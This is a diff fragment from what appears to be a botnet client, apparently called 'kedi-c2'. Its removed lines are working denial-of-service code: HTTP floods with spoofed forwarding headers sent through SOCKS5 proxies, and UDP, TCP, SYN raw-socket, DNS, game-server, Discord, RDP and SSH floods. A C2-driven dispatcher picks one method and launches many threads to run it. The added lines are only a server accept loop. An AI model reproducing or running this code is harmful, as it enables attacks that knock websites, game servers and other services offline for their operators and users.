-                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                                "accept-encoding": "gzip, deflate, br",
-                                "connection": "keep-alive",
-                                "encrypted-data": encrypted_data
-                            }
-                            stream_id = conn.get_next_available_stream_id()
-                            conn.send_headers(stream_id , payl)
-                            s.sendall(conn.data_to_send())
-                    except:
-                        pass
-
-            def spoof_storm():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            sok5 = open('theprxy.txt' , 'r').read().split()
-                            s = socksocket()
-                            pri = che(sok5).split(':');
-                            s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
-                            s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
-                            s = ctx.wrap_socket(s , server_hostname=target)
-                            s.connect((target , port))
-                        else:
-                            s = socksocket()
-                            pri = che(sok5).split(':');
-                            s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
-                            s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
-                            s.connect((target , port))
-                        for _ in range(rpc):
-                            ipt = spo_ip()
-                            payl = f'GET {path}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()
-                            s.send(payl)
-                    except:
-                        pass
-                             
-            try:
-                ip_tt = str(c2.split()[2])
-            except:
-                pass
-
-            def udp():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = byt(1024)
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def tcp():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = byt(1024)
-                            s.send(payl)
-                    except:
-                        pass
-
-            def gudp():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\00\x00'
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def gtcp():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = b"\x6B\x65\x64\x69\x63\x32\x20\x64\x61\x74\x61\x20\x6F\x6E\x74\x6F\x70\x20\x6D\x79\x20\x6F\x77\x6E\x20\x61\x73\x73\x20\x61\x6D\x70\x2F\x74\x72\x69\x70\x68\x65\x6E\x74\x20\x69\x73\x20\x6D\x79\x20\x64\x69\x63\x6B\x20\x61\x6E\x64\x20\x62\x61\x6C\x6C\x73"
-                            s.send(payl)
-                    except:
-                        pass
-
-            def dns():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = dns_gen(ip_tt)
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def syn():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
-                        s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
-                        for _ in range(rpc):
-                            payl = syn_gen(ip_tt , port)
-                            s.sendto(payl)
-                    except:
-                        pass
-
-            def udp_bypass():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = gen_payl()
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def tcp_bypass():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = gen_payl()
-                            s.send(payl)
-                    except:
-                        pass
-
-            def ts3():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = gen_payl()
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-            def fiv():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = (b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73'
-                                    b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00')
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def vse():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def pps():
-                while time() < timer:
-                    try:
-                        s1 = socket(AF_INET , SOCK_STREAM)
-                        s2 = socket(AF_INET , SOCK_DGRAM)
-                        s1.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = gen_payl()
-                            s1.send(payl)
-                            s2.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def udp_raw():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_RAW , IPPROTO_UDP)
-                        s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
-                        for _ in range(rpc):
-                            payl = udp_raw_head(ip_tt , port)
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def tcp_raw():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
-                        s.setsockopt(IPPROTO_IP , IP_HDRINCL , 1)
-                        for _ in range(rpc):
-                            payl = gen_payl()
-                            s.sendto(payl)
-                    except:
-                        pass
-
-            def game():
-                while time() < timer:
-                    try:
-                        s1 = socket(AF_INET , SOCK_STREAM)
-                        s2 = socket(AF_INET , SOCK_DGRAM)
-                        s1.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl1 = game_udp(ip_tt , port)
-                            payl2 = game_tcp(ip_tt , port)
-                            s1.send(payl2)
-                            s2.sendto(payl1 , (ip_tt , port))
-                    except:
-                        pass
-
-            def r6():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = r6_gen(ip_tt , port)
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def tcp_boom():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = tcpamp(source_port=port , dest_port=port , seq_num=1 , ack_num=0 , data_offset=5 , flags=0x12 , window_size=65535 , checksum=0 , urgent_pointer=0)
-                            s.send(payl)
-                    except:
-                        pass
-
-            def udp_boom():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            source_port = port
-                            dest_port = port
-                            length = 8 + len(b'<==kedi-c2/botnet-on-top-mother-fucker==>')
-                            checksum = 0
-                            data = b'<==kedi-c2/botnet-on-top-mother-fucker==>'
-                            udp_payload = udpxd(source_port , dest_port , length , checksum , data)
-                            payl = udp_payload.pack()
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def discord():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_DGRAM)
-                        for _ in range(rpc):
-                            payl = (b"\xF8\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"
-                                    b"\x70\x69\x6E\x67\xF8\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def tcp_paf():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_RAW , IPPROTO_TCP)
-                        for _ in range(rpc):
-                            payl = tcp_paf_data(ip_tt , port)
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def tcp_conn():
-                while time() < timer:
-                    try:
-                        us = UserAgent()
-                        ua = us.random
-                        ctx = create_default_context(cafile=where())
-                        ctx.check_hostname = False
-                        ctx.verify_mode = CERT_NONE
-                        parsed_url = urlparse(url)
-                        ip_tt = parsed_url.netloc
-                        path = parsed_url.path
-                        if path == "":
-                            path = "/"
-                        def generate_fake_phpsessid(length):
-                            characters = ascii_letters + digits
-                            fake_phpsessid = ''.join(che(characters) for _ in range(length))
-                            return fake_phpsessid
-                        fake_cookie_phpsessid = generate_fake_phpsessid(147)
-                        fake_cookie_phpsessidd = generate_fake_phpsessid(32)
-                        response = get(url)
-                        cookie = response.cookies
-                        if cookie == '':
-                            cookie = ("cf_clearance="+fake_cookie_phpsessid, "PHPSSID="+fake_cookie_phpsessidd)
-                        if port == 443:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s , server_hostname=ip_tt)
-                            s.connect((ip_tt , port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = tcp_connhex(path , ip_tt , ua , cookie)
-                            s.sendto(payl , (ip_tt , port))
-                    except:
-                        pass
-
-            def tcp_hand():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = handshaketcp(port)
-                            s.send(payl)
-                    except:
-                        pass
-
-            def rdp():
-                while True:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt,port))
-                        for _ in range(rpc):
-                            payl = b'\x00\x0b\x00\x00\x00'
-                            s.send(payl)
-                    except:
-                        pass
-                
-            def tcp_80():
-                while True:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt,port))
-                        for _ in range(rpc):
-                            payl = b'\x0e\x00\x00\x00\x00\x00\x00\x00\x00'
-                            s.send(payl)
-                    except:
-                        pass
-
-            def ssh():
-                while True:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = b"\x53\x53\x48\x2d\x32\x2e\x30\x2d\x4f\x70\x65\x6e\x53\x53\x48"
-                            s.send(payl)
-                    except:
-                        pass
-
-            def tcp_storm():
-                while True:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((ip_tt , port))
-                        for _ in range(rpc):
-                            payl = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
-                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
-                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
-                   b'\x73')
-                            s.send(payl)
-                    except:
-                        pass
-
-        try:
-            if method == 'raw':
-                for _ in range(threads):
-                    thr(target=raw).start()
-            elif method == 'get':
-                for _ in range(threads):
-                    thr(target=get).start()
-            elif method == 'rapid-reset':
-                for _ in range(threads):
-                    thr(target=rapid).start()
-            elif method == 'spoof':
-                for _ in range(threads):
-                    thr(target=spoof).start()
-            elif method == 'post':
-                for _ in range(threads):
-                    thr(target=post).start()
-            elif method == 'bypass':
-                for _ in range(threads):
-                    thr(target=bypass).start()
-            elif method == 'browser':
-                for _ in range(threads):
-                    thr(target=browser).start()
-            elif method == 'put':
-                for _ in range(threads):
-                    thr(target=put).start()
-            elif method == 'http-mix':
-                for _ in range(threads):
-                    thr(target=http_mix).start()
-            elif method == 'http':
-                for _ in range(threads):
-                    thr(target=http).start()
-            elif method == 'xmlrpc':
-                for _ in range(threads):
-                    thr(target=xmlrpc).start()
-            elif method == 'https':
-                for _ in range(threads):
-                    thr(target=https).start()
-            elif method == 'spoof-storm':
-                for _ in range(threads):
-                    thr(target=spoof_storm).start()
-            elif method == 'udp':
-                for _ in range(threads):
-                    thr(target=udp).start()
-            elif method == 'tcp':
-                for _ in range(threads):
-                    thr(target=tcp).start()
-            elif method == 'gudp':
-                for _ in range(threads):
-                    thr(target=gudp).start()
-            elif method == 'gtcp':
-                for _ in range(threads):
-                    thr(target=gtcp).start()
-            elif method == 'dns':
-                for _ in range(threads):
-                    thr(target=dns).start()
-            elif method == 'syn':
-                for _ in range(threads):
-                    thr(target=syn).start()
-            elif method == 'udp-bypass':
-                for _ in range(threads):
-                    thr(target=udp_bypass).start()
-            elif method == 'tcp-bypass':
-                for _ in range(threads):
-                    thr(target=tcp_bypass).start()
-            elif method == 'ts3':
-                for _ in range(threads):
-                    thr(target=ts3).start()
-            elif method == 'fiv':
-                for _ in range(threads):
-                    thr(target=fiv).start()
-            elif method == 'vse':
-                for _ in range(threads):
-                    thr(target=vse).start()
-            elif method == 'pps':
-                for _ in range(threads):
-                    thr(target=pps).start()
-            elif method == 'udp-raw':
-                for _ in range(threads):
-                    thr(target=udp_raw).start()
-            elif method == 'tcp-raw':
-                for _ in range(threads):
-                    thr(target=tcp_raw).start()
-            elif method == 'game':
-                for _ in range(threads):
-                    thr(target=game).start()
-            elif method == 'r6':
-                for _ in range(threads):
-                    thr(target=r6).start()
-            elif method == 'tcp-boom':
-                for _ in range(threads):
-                    thr(target=tcp_boom).start()
-            elif method == 'udp-boom':
-                for _ in range(threads):
-                    thr(target=udp_boom).start()
-            elif method == 'discord':
-                for _ in range(threads):
-                    thr(target=discord).start()
-            elif method == 'tcp-paf':
-                for _ in range(threads):
-                    thr(target=tcp_paf).start()
-            elif method == 'tcp-hand':
-                for _ in range(threads):
-                    thr(target=tcp_hand).start()
-            elif method == 'tcp-conn':
-                for _ in range(threads):
-                    thr(target=tcp_conn).start()
-            elif method == 'rdp':
-                for _ in range(threads):
-                    thr(target=rdp).start()
-            elif method == 'tcp-80':
-                for _ in range(threads):
-                    thr(target=tcp_80).start()
-            elif method == 'ssh':
-                for _ in range(threads):
-                    thr(target=ssh).start()
-            elif method == 'tcp-storm':
-                for _ in range(threads):
-                    thr(target=tcp_storm).start()
-        except:
-            pass
-
-main()
+while True:
+    try:
+        conn , addr = s.accept()
+        thr(target=app , args=(conn , addr)).start()
+    except Exception as e:
+        print(f"{red}[{yellow}+{red}] {green}Error accepting connection {red}: {cyan}{e}")
